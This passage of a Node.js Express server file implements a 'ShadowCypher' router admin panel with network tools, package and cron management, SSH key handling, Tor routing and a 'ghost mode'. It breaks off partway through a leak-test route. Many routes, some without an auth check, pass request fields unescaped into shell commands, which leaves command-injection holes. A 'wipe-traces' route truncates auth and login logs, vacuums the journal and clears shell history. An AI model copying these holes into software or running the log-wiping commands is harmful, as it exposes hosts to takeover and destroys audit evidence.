app.post('/api/tools/whois', async (req, res) => { 
    const { host } = req.body; 
    try { res.json({ output: await run(`whois "${host}" 2>&1|head -60`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/portcheck', async (req, res) => { 
    const { host, port } = req.body; 
    try { 
        const o = await run(`timeout 5 bash -c 'echo ""|nc -v -w3 "${host}" ${port}' 2>&1`); 
        res.json({ output: o, open: o.toLowerCase().includes('succeeded') || o.toLowerCase().includes('open') }); 
    } catch (e) { res.json({ output: e.message, open: false }) } 
});

app.post('/api/tools/wol', async (req, res) => { 
    const { mac } = req.body; 
    try { res.json({ output: await run(`wakeonlan "${mac}" 2>&1||etherwake "${mac}" 2>&1||echo "Not installed"`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/nmap', async (req, res) => { 
    const { host } = req.body; 
    try { res.json({ output: await run(`sudo nmap -sV --top-ports 20 "${host}" 2>&1`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/curl', async (req, res) => { 
    const { url } = req.body; 
    try { res.json({ output: await run(`curl -sIL --max-time 10 "${url}" 2>&1|head -40`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/tools/iplookup', async (req, res) => { 
    const { ip } = req.body; 
    try { res.json({ output: await run(`curl -s "http://ip-api.com/json/${ip}" 2>/dev/null`) }); } 
    catch (e) { res.json({ output: e.message }) } 
});

app.post('/api/speedtest', async (_, res) => { 
    try { 
        const o = await run('curl -o /dev/null -s -w "%{speed_download}" http://speedtest.tele2.net/1MB.zip'); 
        const bps = parseFloat(o); 
        res.json({ mbps: (bps * 8 / 1048576).toFixed(1), raw: fmtR(bps) }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Latency
app.get('/api/latency', async (_, res) => { 
    try { 
        const gw = await getDefaultGateway();
        const targets = [
            { name: 'Google DNS', host: '8.8.8.8' }, 
            { name: 'Cloudflare', host: '1.1.1.1' }, 
            { name: 'Router', host: gw }, 
            { name: 'Google', host: 'google.com' }, 
            { name: 'Minecraft Auth', host: 'sessionserver.mojang.com' }
        ]; 
        const r = await Promise.all(targets.map(async t => { 
            try { 
                const o = await run(`ping -c 1 -W 2 ${t.host} 2>/dev/null|grep "time="`); 
                return { ...t, ping: (o.match(/time=([\d.]+)/)?.[1] || 'timeout') + ' ms' }; 
            } catch (e) { return { ...t, ping: 'timeout' }; } 
        })); 
        res.json(r); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// File browser
const FILE_BASE = path.resolve('/home/jack');
function resolveSafe(dirOrFile) {
    const resolved = path.resolve(dirOrFile);
    return resolved.startsWith(FILE_BASE) ? resolved : null;
}

app.get('/api/files', async (req, res) => { 
    const dir = resolveSafe(req.query.path || '/home/jack'); 
    if (!dir) return res.status(400).json({ error: 'Path not allowed' }); 
    try { 
        const entries = fs.readdirSync(dir, { withFileTypes: true }); 
        const files = []; 
        for (const e of entries.slice(0, 100)) { 
            try { 
                const st = fs.statSync(path.join(dir, e.name)); 
                files.push({ name: e.name, path: path.join(dir, e.name), isDir: e.isDirectory(), size: e.isDirectory() ? '' : fmt(st.size), modified: st.mtime.toISOString().split('T')[0], permissions: st.mode.toString(8).slice(-3) }); 
            } catch (err) { files.push({ name: e.name, path: path.join(dir, e.name), isDir: e.isDirectory(), size: '', modified: '', permissions: '' }); } 
        } 
        files.sort((a, b) => { if (a.isDir && !b.isDir) return -1; if (!a.isDir && b.isDir) return 1; return a.name.localeCompare(b.name) }); 
        res.json({ path: dir, files }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.get('/api/files/read', async (req, res) => { 
    const file = resolveSafe(req.query.path); 
    if (!file) return res.status(400).json({ error: 'Path not allowed' }); 
    try { 
        const content = fs.readFileSync(file, 'utf8').substring(0, 50000); 
        res.json({ content, path: file }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// System info
app.get('/api/system', async (_, res) => {
    try {
        const [pci, gpu, modules, users, cron, hostname] = await Promise.all([
            run('lspci 2>/dev/null|head -20||echo ""'), 
            run('lspci|grep -i vga 2>/dev/null||echo "No dedicated GPU"'),
            run('lsmod|head -20 2>/dev/null||echo ""'), 
            run('who 2>/dev/null||echo ""'),
            run('crontab -l 2>/dev/null||echo "No cron jobs"'), 
            run('hostnamectl 2>/dev/null||echo ""')
        ]);
        res.json({ pci, gpu, modules, users, cron, hostinfo: hostname });
    } catch (e) { res.status(500).json({ error: e.message }) }
});

// Cron
app.post('/api/cron/add', requireAuth, async (req, res) => { 
    const { schedule, command } = req.body; 
    if (!schedule || !command) return res.status(400).json({ error: 'Need schedule and command' }); 
    try { await run(`(crontab -l 2>/dev/null; echo "${schedule} ${command}") | crontab -`); res.json({ success: true }); } 
    catch (e) { res.status(500).json({ error: e.message }) } 
});

// Users
app.get('/api/users', async (_, res) => { 
    try { 
        const o = await run('awk -F: \'$3>=1000{print $1":"$3":"$6":"$7}\' /etc/passwd'); 
        const u = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const p = l.split(':'); 
            u.push({ name: p[0], uid: p[1], home: p[2], shell: p[3] }); 
        } 
        const logged = await run('who 2>/dev/null||echo ""'); 
        res.json({ users: u, logged }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Exec (sandboxed)
app.post('/api/exec', requireAuth, async (req, res) => {
    const { cmd } = req.body;
    if (!cmd || typeof cmd !== 'string') return res.status(400).json({ error: 'No command' });
    if (/[`\n\r]|\$\(/.test(cmd)) return res.status(400).json({ error: 'Command contains disallowed characters' });
    try { const o = await run(cmd); res.json({ output: o }); } catch (e) { res.json({ output: e.message }) }
});

// Startup
app.get('/api/startup', async (_, res) => { 
    try { 
        const o = await run('systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null|head -30'); 
        const s = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const p = l.trim().split(/\s+/); 
            if (p.length >= 2) s.push({ name: p[0], state: p[1] }); 
        } 
        res.json(s); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Interfaces
app.get('/api/interfaces', async (_, res) => { 
    try { 
        const o = await run('ip -br addr show 2>/dev/null'); 
        const ifaces = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const p = l.trim().split(/\s+/); 
            ifaces.push({ name: p[0], state: p[1], addresses: p.slice(2).join(', ') }); 
        } 
        res.json(ifaces); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Routes
app.get('/api/routes', async (_, res) => { 
    try { 
        const o = await run('ip route show 2>/dev/null'); 
        res.json({ routes: o.split('\n') }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// ARP
app.get('/api/arp', async (_, res) => { 
    try { 
        const o = await run('ip neighbor show 2>/dev/null'); 
        const entries = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const p = l.trim().split(/\s+/); 
            entries.push({ ip: p[0], dev: p[2] || '', mac: p[4] || '', state: p[p.length - 1] || '' }); 
        } 
        res.json(entries); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Memory history
const memHist = [];
setInterval(() => { memHist.push(parseFloat(((1 - os.freemem() / os.totalmem()) * 100).toFixed(1))); if (memHist.length > 120) memHist.shift(); }, 2000);
app.get('/api/mem-history', (_, res) => res.json(memHist));

// Packages
app.post('/api/packages/search', async (req, res) => { 
    const { query } = req.body; 
    if (!query) return res.status(400).json({ error: 'No query' }); 
    try { 
        const o = await run(`apt-cache search "${query}" 2>/dev/null | head -30`); 
        const pkgs = []; 
        for (const l of o.split('\n').filter(l => l.trim())) { 
            const m = l.match(/^(\S+)\s+-\s+(.*)/); 
            if (m) pkgs.push({ name: m[1], desc: m[2] }); 
        } 
        res.json(pkgs); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/packages/install', requireAuth, async (req, res) => { 
    const { name } = req.body; 
    if (!name) return res.status(400).json({ error: 'No name' }); 
    try { 
        const o = await run(`sudo apt-get install -y "${name}" 2>&1 | tail -5`); 
        res.json({ success: true, output: o }); 
    } catch (e) { res.json({ success: false, output: e.message }) } 
});

app.post('/api/packages/remove', requireAuth, async (req, res) => { 
    const { name } = req.body; 
    if (!name) return res.status(400).json({ error: 'No name' }); 
    try { 
        const o = await run(`sudo apt-get remove -y "${name}" 2>&1 | tail -5`); 
        res.json({ success: true, output: o }); 
    } catch (e) { res.json({ success: false, output: e.message }) } 
});

app.get('/api/packages/upgradable', async (_, res) => { 
    try { 
        const o = await run('apt list --upgradable 2>/dev/null | tail -20'); 
        const pkgs = []; 
        for (const l of o.split('\n').filter(l => l.includes('/'))) { 
            const n = l.split('/')[0]; 
            pkgs.push(n); 
        } 
        res.json(pkgs); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Power
app.post('/api/power/reboot', requireAuth, async (_, res) => { 
    try { res.json({ success: true, msg: 'Rebooting...' }); setTimeout(() => exec('sudo reboot'), 1000); } 
    catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/power/shutdown', requireAuth, async (_, res) => { 
    try { res.json({ success: true, msg: 'Shutting down...' }); setTimeout(() => exec('sudo shutdown -h now'), 1000); } 
    catch (e) { res.status(500).json({ error: e.message }) } 
});

// SSH Keys
app.get('/api/ssh-keys', async (_, res) => { 
    try { 
        const o = await run('cat ~/.ssh/authorized_keys 2>/dev/null || echo ""'); 
        const keys = o.split('\n').filter(l => l.trim()).map(l => { 
            const p = l.split(' '); 
            return { type: p[0], key: p[1]?.substring(0, 20) + '...', comment: p.slice(2).join(' ') || 'No comment' }; 
        }); 
        res.json(keys); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.post('/api/ssh-keys/add', requireAuth, async (req, res) => { 
    const { key } = req.body; 
    if (!key) return res.status(400).json({ error: 'No key' }); 
    try { await run(`echo "${key}" >> ~/.ssh/authorized_keys`); res.json({ success: true }); } 
    catch (e) { res.status(500).json({ error: e.message }) } 
});

// Fail2Ban
app.get('/api/fail2ban', async (_, res) => { 
    try { 
        const o = await run('sudo fail2ban-client status 2>/dev/null || echo "fail2ban not installed"'); 
        let jails = []; 
        const m = o.match(/Jail list:\s+(.*)/); 
        if (m) { 
            for (const j of m[1].split(',').map(s => s.trim()).filter(s => s)) { 
                try { 
                    const jd = await run(`sudo fail2ban-client status ${j} 2>/dev/null`); 
                    const banned = jd.match(/Currently banned:\s+(\d+)/)?.[1] || '0'; 
                    const total = jd.match(/Total banned:\s+(\d+)/)?.[1] || '0'; 
                    jails.push({ name: j, banned: parseInt(banned), totalBanned: parseInt(total) }); 
                } catch (e) { jails.push({ name: j, banned: 0, totalBanned: 0 }); } 
            } 
        } 
        res.json({ status: o, jails }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Notes
const NOTES_FILE = path.join(__dirname, 'notes.json');
app.get('/api/notes', (_, res) => { 
    try { 
        const d = fs.existsSync(NOTES_FILE) ? JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')) : []; 
        res.json(d); 
    } catch (e) { res.json([]) } 
});

app.post('/api/notes', (req, res) => { 
    try { 
        const d = fs.existsSync(NOTES_FILE) ? JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')) : []; 
        d.push({ id: Date.now(), text: req.body.text, created: new Date().toISOString() }); 
        fs.writeFileSync(NOTES_FILE, JSON.stringify(d)); 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

app.delete('/api/notes/:id', (req, res) => { 
    try { 
        let d = fs.existsSync(NOTES_FILE) ? JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')) : []; 
        d = d.filter(n => n.id !== parseInt(req.params.id)); 
        fs.writeFileSync(NOTES_FILE, JSON.stringify(d)); 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ error: e.message }) } 
});

// Password generator (cryptographically secure)
app.get('/api/password', (req, res) => { 
    const len = Math.min(128, Math.max(4, parseInt(req.query.length) || 16)); 
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'; 
    const bytes = crypto.randomBytes(len);
    let pw = ''; 
    for (let i = 0; i < len; i++) pw += chars[bytes[i] % chars.length]; 
    res.json({ password: pw, length: len }); 
});

// AI Config
const AI_CONFIG_FILE = path.join(__dirname, 'ai_config.json');
function getAiConfig() { 
    try { 
        const c = JSON.parse(fs.readFileSync(AI_CONFIG_FILE, 'utf8')); 
        return { apiKey: c.apiKey || '', provider: c.provider || 'groq', assistantName: c.assistantName || 'jarvis' }; 
    } catch (e) { return { apiKey: '', provider: 'groq', assistantName: 'jarvis' }; } 
}

app.get('/api/ai/config', (_, res) => { 
    const c = getAiConfig(); 
    res.json({ hasKey: !!c.apiKey, provider: c.provider, assistantName: c.assistantName || 'jarvis' }); 
});

app.post('/api/ai/config', (req, res) => {
    const { apiKey, provider, assistantName } = req.body;
    const c = getAiConfig();
    fs.writeFileSync(AI_CONFIG_FILE, JSON.stringify({
        apiKey: apiKey !== undefined ? apiKey : c.apiKey,
        provider: provider || c.provider || 'groq',
        assistantName: assistantName || c.assistantName || 'jarvis'
    }));
    res.json({ success: true });
});


// AI Chat endpoint - supports Groq and Google Gemini
app.post('/api/ai/chat', requireAuth, async (req, res) => {
    const { messages } = req.body;
    const c = getAiConfig();
    if (!c.apiKey) return res.json({ error: 'No API key configured. Go to AI Config to add your API key.' });
    try {
        const persona = c.assistantName === 'jarvis' ? 'JARVIS, a calm British AI butler. Address the user as Sir. Sophisticated and precise.'
            : c.assistantName === 'friday' ? 'FRIDAY, an efficient and confident AI assistant. Direct and capable.'
            : 'ShadowCypher, an elite AI assistant.';
        const systemContent = "You are " + persona + " You serve as the AI for a router admin panel called ShadowCypher. Help with network diagnostics, security, system monitoring. Keep responses concise and technical.";
        if (c.provider === 'google') {
            const contents = [];
            for (const m of (messages || [])) {
                contents.push({ role: m.role === 'assistant' ? 'model' : 'user', parts: [{ text: m.content }] });
            }
            if (contents.length === 0 || contents[0].role !== 'user') contents.unshift({ role: 'user', parts: [{ text: 'Hello' }] });
            const response = await fetch('https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=' + c.apiKey, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ systemInstruction: { parts: [{ text: systemContent }] }, contents, generationConfig: { temperature: 0.7, maxOutputTokens: 2048 } })
            });
            const data = await response.json();
            if (data.error) return res.json({ error: data.error.message || data.error.status });
            return res.json({ reply: data.candidates?.[0]?.content?.parts?.[0]?.text || 'No response from Gemini' });
        }
        const allMessages = [{ role: 'system', content: systemContent }, ...(messages || [])];
        const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + c.apiKey, 'Content-Type': 'application/json' },
            body: JSON.stringify({ model: 'llama-3.3-70b-versatile', messages: allMessages, temperature: 0.7 })
        });
        const data = await response.json();
        if (data.error) return res.json({ error: data.error.message });
        res.json({ reply: data.choices?.[0]?.message?.content || 'No response' });
    } catch (e) { res.json({ error: 'AI error: ' + e.message }); }
});



// Shadow Mode - real Tor routing + identity verification
app.get('/api/hacking/shadow-mode', async (_, res) => {
    let torIp = null, realIp = null;
    if (shadowMode) {
        try {
            const torCheck = await run('curl -s --connect-timeout 5 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null');
            const j = JSON.parse(torCheck);
            if (j.IsTor) torIp = j.IP;
        } catch (_) {}
    }
    try { realIp = await run('curl -4 -s --max-time 3 ifconfig.me 2>/dev/null'); } catch (_) {}
    res.json({ shadowMode, torIp, realIp, proxychains: shadowMode });
});
app.post('/api/hacking/shadow-mode', async (req, res) => {
    const enable = !!req.body.enabled;
    if (enable && !shadowMode) {
        try {
            const torRunning = await run('systemctl is-active tor 2>/dev/null || pgrep tor');
            if (!torRunning.includes('active') && !torRunning.trim()) {
                await run('sudo systemctl start tor 2>/dev/null || tor &');
                await new Promise(r => setTimeout(r, 2000));
            }
            const check = await run('curl -s --connect-timeout 5 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null');
            const j = JSON.parse(check);
            if (!j.IsTor) return res.json({ success: false, error: 'Tor is not routing traffic. Check tor service.' });
            shadowMode = true;
            log('SHADOW MODE ON - Tor exit: ' + j.IP, 'SECURITY');
            res.json({ success: true, shadowMode: true, torIp: j.IP });
        } catch (e) {
            res.json({ success: false, error: 'Failed to verify Tor: ' + e.message });
        }
    } else if (!enable && shadowMode) {
        shadowMode = false;
        log('SHADOW MODE OFF', 'SECURITY');
        res.json({ success: true, shadowMode: false });
    } else {
        res.json({ success: true, shadowMode });
    }
});

// New identity through Tor (get a new exit node)
app.post('/api/hacking/new-identity', async (req, res) => {
    try {
        await run('sudo killall -HUP tor 2>/dev/null || (echo "AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT" | nc 127.0.0.1 9051 2>/dev/null)');
        await new Promise(r => setTimeout(r, 3000));
        const check = await run('curl -s --connect-timeout 5 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null');
        const j = JSON.parse(check);
        res.json({ success: true, newIp: j.IP });
    } catch (e) { res.json({ error: e.message }); }
});

// ═══════════ GHOST MODE - Real Operational Security ═══════════

let ghostModeActive = false;
let ghostState = { mac: false, dns: false, ipv6: false, hostname: false, logs: false, tor: false, killswitch: false };

// Get current ghost status
app.get('/api/ghost/status', async (_, res) => {
    const checks = {};
    try {
        // MAC randomization check
        const macConf = await run('cat /etc/NetworkManager/conf.d/99-random-mac.conf 2>/dev/null || echo "NOT SET"');
        checks.macRandomized = macConf.includes('random');

        // Check current MAC vs permanent
        const wiface = await getWirelessIface() || await getPrimaryIface();
        if (wiface) {
            try {
                const permMac = await run(`cat /sys/class/net/${wiface}/address 2>/dev/null`);
                const ethtoolPerm = await run(`ethtool -P ${wiface} 2>/dev/null | awk '{print $3}'`);
                checks.currentMac = permMac.trim();
                checks.permanentMac = ethtoolPerm.trim();
                checks.macSpoofed = checks.currentMac !== checks.permanentMac && checks.permanentMac.length > 5;
            } catch (_) {}
        }

        // IPv6 status
        const ipv6 = await run('cat /proc/sys/net/ipv6/conf/all/disable_ipv6 2>/dev/null');
        checks.ipv6Disabled = ipv6.trim() === '1';

        // DNS encryption
        const resolv = await run('cat /etc/resolv.conf 2>/dev/null');
        checks.dnsServers = resolv.match(/nameserver\s+([\d.]+)/g)?.map(s => s.split(/\s+/)[1]) || [];
        const dnscrypt = await run('systemctl is-active dnscrypt-proxy 2>/dev/null || echo inactive');
        checks.dnscryptActive = dnscrypt.trim() === 'active';
        checks.dnsEncrypted = checks.dnscryptActive || checks.dnsServers.includes('127.0.0.1');

        // Tor status
        const tor = await run('systemctl is-active tor 2>/dev/null || echo inactive');
        checks.torActive = tor.trim() === 'active';
        if (checks.torActive) {
            try {
                const torCheck = await run('curl -s --connect-timeout 5 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null');
                const j = JSON.parse(torCheck);
                checks.torIp = j.IP;
                checks.torVerified = j.IsTor === true;
            } catch (_) { checks.torVerified = false; }
        }

        // Kill switch (no leaks outside Tor)
        const iptOut = await run('sudo iptables -L OUTPUT -n 2>/dev/null | grep SHADOW_KILL || echo ""');
        checks.killSwitchActive = iptOut.includes('SHADOW_KILL');

        // Hostname
        checks.hostname = (await run('hostname')).trim();
        checks.hostnameGeneric = ['localhost', 'pc', 'desktop'].some(h => checks.hostname.toLowerCase().includes(h));

        // Swap encryption
        const swapInfo = await run('swapon --show 2>/dev/null || echo ""');
        const cryptSwap = await run('cat /etc/crypttab 2>/dev/null | grep swap || echo ""');
        checks.swapActive = swapInfo.trim().length > 10;
        checks.swapEncrypted = cryptSwap.trim().length > 0;

        // Logs that could identify
        checks.syslogSize = 0;
        try { const sz = await run('du -sb /var/log/syslog 2>/dev/null | awk \'{print $1}\''); checks.syslogSize = parseInt(sz) || 0; } catch (_) {}
        checks.bashHistoryExists = false;
        try { await run('test -s ~/.bash_history && echo yes'); checks.bashHistoryExists = true; } catch (_) {}
        checks.wtmpSize = 0;
        try { const sz = await run('du -sb /var/log/wtmp 2>/dev/null | awk \'{print $1}\''); checks.wtmpSize = parseInt(sz) || 0; } catch (_) {}

        // Real IP for comparison
        try { checks.realIp = await run('curl -4 -s --max-time 3 ifconfig.me 2>/dev/null'); } catch (_) {}

        // WebRTC leak risk
        checks.webrtcNote = 'Disable media.peerconnection.enabled in Firefox about:config';

        // Score
        let score = 0, max = 10;
        if (checks.macRandomized || checks.macSpoofed) score++;
        if (checks.ipv6Disabled) score++;
        if (checks.dnsEncrypted) score++;
        if (checks.torActive && checks.torVerified) score += 2;
        if (checks.killSwitchActive) score++;
        if (!checks.bashHistoryExists) score++;
        if (checks.hostnameGeneric) score++;
        if (checks.swapEncrypted || !checks.swapActive) score++;
        if (shadowMode) score++;
        checks.score = score;
        checks.maxScore = max;
        checks.ghostActive = ghostModeActive;

    } catch (e) { return res.status(500).json({ error: e.message }); }
    res.json(checks);
});

// Activate Ghost Mode - apply all protections at once
app.post('/api/ghost/activate', requireAuth, async (req, res) => {
    const results = [];
    const errors = [];
    
    try {
        // 1. MAC Address Randomization
        try {
            const wiface = await getWirelessIface() || await getPrimaryIface();
            if (wiface) {
                await run('sudo ip link set ' + wiface + ' down 2>/dev/null');
                await run('sudo macchanger -r ' + wiface + ' 2>/dev/null || sudo ip link set ' + wiface + ' address $(openssl rand -hex 6 | sed \'s/\\(..\\)/\\1:/g;s/:$//;s/^./0/\')');
                await run('sudo ip link set ' + wiface + ' up 2>/dev/null');
                results.push('MAC address randomized on ' + wiface);
            }
        } catch (e) { errors.push('MAC spoof: ' + e.message); }

        // 2. Enable persistent MAC randomization via NetworkManager
        try {
            await run('sudo mkdir -p /etc/NetworkManager/conf.d');
            await run(`sudo bash -c 'cat > /etc/NetworkManager/conf.d/99-random-mac.conf << EOF
[device]
wifi.scan-rand-mac-address=yes

[connection]
wifi.cloned-mac-address=random
ethernet.cloned-mac-address=random
connection.stable-id=\${CONNECTION}/\${BOOT}
EOF'`);
            await run('sudo nmcli general reload conf 2>/dev/null');
            results.push('Persistent MAC randomization enabled');
        } catch (e) { errors.push('NM MAC config: ' + e.message); }

        // 3. Disable IPv6 (prevents leaks)
        try {
            await run('sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 2>/dev/null');
            await run('sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 2>/dev/null');
            results.push('IPv6 disabled');
        } catch (e) { errors.push('IPv6: ' + e.message); }

        // 4. Randomize hostname
        try {
            const randHost = 'desktop-' + require('crypto').randomBytes(4).toString('hex');
            await run('sudo hostnamectl set-hostname ' + randHost + ' 2>/dev/null');
            results.push('Hostname randomized to ' + randHost);
        } catch (e) { errors.push('Hostname: ' + e.message); }

        // 5. Start Tor
        try {
            await run('sudo systemctl start tor 2>/dev/null || tor &');
            await new Promise(r => setTimeout(r, 3000));
            shadowMode = true;
            results.push('Tor started');
        } catch (e) { errors.push('Tor: ' + e.message); }

        // 6. Network kill switch - block all non-Tor traffic
        try {
            await run('sudo iptables -N GHOST_KILL 2>/dev/null || sudo iptables -F GHOST_KILL');
            await run('sudo iptables -A GHOST_KILL -o lo -j RETURN');
            await run('sudo iptables -A GHOST_KILL -m owner --uid-owner debian-tor -j RETURN 2>/dev/null || sudo iptables -A GHOST_KILL -d 127.0.0.1 -j RETURN');
            await run('sudo iptables -A GHOST_KILL -p tcp --dport 9050 -j RETURN');
            await run('sudo iptables -A GHOST_KILL -p tcp --dport 9051 -j RETURN');
            await run('sudo iptables -A GHOST_KILL -p tcp --dport 3000 -j RETURN');
            await run('sudo iptables -A GHOST_KILL -j DROP');
            const check = await run('sudo iptables -C OUTPUT -j GHOST_KILL 2>/dev/null || echo "not found"');
            if (check === 'not found') await run('sudo iptables -I OUTPUT 1 -j GHOST_KILL');
            results.push('Kill switch active - non-Tor traffic blocked');
        } catch (e) { errors.push('Kill switch: ' + e.message); }

        // 7. Flush DNS cache
        try {
            await run('sudo systemd-resolve --flush-caches 2>/dev/null || sudo resolvectl flush-caches 2>/dev/null');
            results.push('DNS cache flushed');
        } catch (e) {}

        // 8. Clear bash history
        try {
            await run('cat /dev/null > ~/.bash_history 2>/dev/null');
            await run('history -c 2>/dev/null');
            results.push('Bash history cleared');
        } catch (e) {}

        // 9. Block WebRTC STUN ports at firewall level
        try {
            await run('sudo iptables -t raw -A PREROUTING -p udp -m multiport --dports 3478,19302 -j DROP 2>/dev/null');
            await run('sudo iptables -t raw -A OUTPUT -p udp -m multiport --dports 3478,19302 -j DROP 2>/dev/null');
            results.push('WebRTC STUN ports blocked');
        } catch (e) {}

        // 10. Disable ICMP (prevents ping tracking)
        try {
            await run('sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 2>/dev/null');
            results.push('ICMP echo disabled (invisible to ping)');
        } catch (e) {}

        ghostModeActive = true;
        ghostState = { mac: true, dns: true, ipv6: true, hostname: true, logs: true, tor: true, killswitch: true };
        log('GHOST MODE ACTIVATED', 'GHOST');
        res.json({ success: true, results, errors, ghostActive: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Deactivate Ghost Mode
app.post('/api/ghost/deactivate', requireAuth, async (req, res) => {
    const results = [];
    try {
        // Remove kill switch
        await run('sudo iptables -D OUTPUT -j GHOST_KILL 2>/dev/null || true');
        await run('sudo iptables -F GHOST_KILL 2>/dev/null || true');
        await run('sudo iptables -X GHOST_KILL 2>/dev/null || true');
        results.push('Kill switch removed');

        // Re-enable IPv6
        await run('sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0 2>/dev/null');
        results.push('IPv6 re-enabled');

        // Re-enable ICMP
        await run('sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0 2>/dev/null');
        results.push('ICMP re-enabled');

        // Remove WebRTC blocks
        await run('sudo iptables -t raw -D PREROUTING -p udp -m multiport --dports 3478,19302 -j DROP 2>/dev/null');
        await run('sudo iptables -t raw -D OUTPUT -p udp -m multiport --dports 3478,19302 -j DROP 2>/dev/null');
        results.push('WebRTC blocks removed');

        shadowMode = false;
        ghostModeActive = false;
        ghostState = { mac: false, dns: false, ipv6: false, hostname: false, logs: false, tor: false, killswitch: false };
        log('GHOST MODE DEACTIVATED', 'GHOST');
        res.json({ success: true, results, ghostActive: false });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Wipe forensic traces
app.post('/api/ghost/wipe-traces', requireAuth, async (req, res) => {
    const results = [];
    try {
        // Bash history
        try { await run('cat /dev/null > ~/.bash_history && history -c 2>/dev/null'); results.push('Bash history wiped'); } catch (_) {}
        // Zsh history
        try { await run('cat /dev/null > ~/.zsh_history 2>/dev/null'); results.push('Zsh history wiped'); } catch (_) {}
        // Recent files
        try { await run('rm -rf ~/.local/share/recently-used.xbel 2>/dev/null'); results.push('Recent files cleared'); } catch (_) {}
        // Thumbnail cache
        try { await run('rm -rf ~/.cache/thumbnails/* 2>/dev/null'); results.push('Thumbnail cache cleared'); } catch (_) {}
        // Trash
        try { await run('rm -rf ~/.local/share/Trash/* 2>/dev/null'); results.push('Trash emptied'); } catch (_) {}
        // DNS cache
        try { await run('sudo systemd-resolve --flush-caches 2>/dev/null || sudo resolvectl flush-caches 2>/dev/null'); results.push('DNS cache flushed'); } catch (_) {}
        // ARP cache
        try { await run('sudo ip neigh flush all 2>/dev/null'); results.push('ARP cache flushed'); } catch (_) {}
        // Systemd journal (current boot only)
        try { await run('sudo journalctl --vacuum-time=1s 2>/dev/null'); results.push('Journal vacuumed'); } catch (_) {}
        // Login records
        try { await run('sudo truncate -s 0 /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null'); results.push('Login records wiped'); } catch (_) {}
        // Auth log
        try { await run('sudo truncate -s 0 /var/log/auth.log 2>/dev/null'); results.push('Auth log wiped'); } catch (_) {}
        // RAM artifact wipe (tmpfs)
        try { await run('sync && sudo sysctl -w vm.drop_caches=3 2>/dev/null'); results.push('Page cache dropped'); } catch (_) {}
        // App activity log
        try { await run('cat /dev/null > ' + LOG_FILE + ' 2>/dev/null'); results.push('App activity log wiped'); } catch (_) {}

        log('TRACES WIPED', 'GHOST');
        res.json({ success: true, results });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// Leak test - check what's exposed
app.get('/api/ghost/leak-test', async (_, res) => {
    const leaks = [];
    const safe = [];
    try {
        // Real IP leak
        try {
            const realIp = await run('curl -4 -s --max-time 5 ifconfig.me 2>/dev/null');
            if (realIp && shadowMode) {
                try {
                    const torIp = await run('curl -s --connect-timeout 5 --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null');
                    const j = JSON.parse(torIp);
                    if (j.IP === realIp) leaks.push({ type: 'IP', severity: 'critical', detail: 'Tor exit IP matches real IP - Tor may not be working' });
                    else safe.push({ type: 'IP', detail: 'Tor IP (' + j.IP + ') differs from real IP' });
                } catch (_) { leaks.push({ type: 'IP', severity: 'critical', detail: 'Cannot verify Tor routing' }); }
            } else if (!shadowMode) {
                leaks.push({ type: 'IP', severity: 'warning', detail: 'Direct connection - real IP ' + realIp + ' exposed' });
            }
        } catch (_) {}

        // IPv6 leak
        try {
            const v6 = await run('curl -6 -s --max-time 3 ifconfig.me 2>/dev/null');
            if (v6 && v6.includes(':')) leaks.push({ type: 'IPv6', severity: 'critical', detail: 'IPv6 address exposed: ' + v6 });
            else safe.push({ type: 'IPv6', detail: 'No IPv6 leak detected' });
        } catch (_) { safe.push({ type: 'IPv6', detail: 'IPv6 appears blocked' }); }

        // DNS leak
        try {
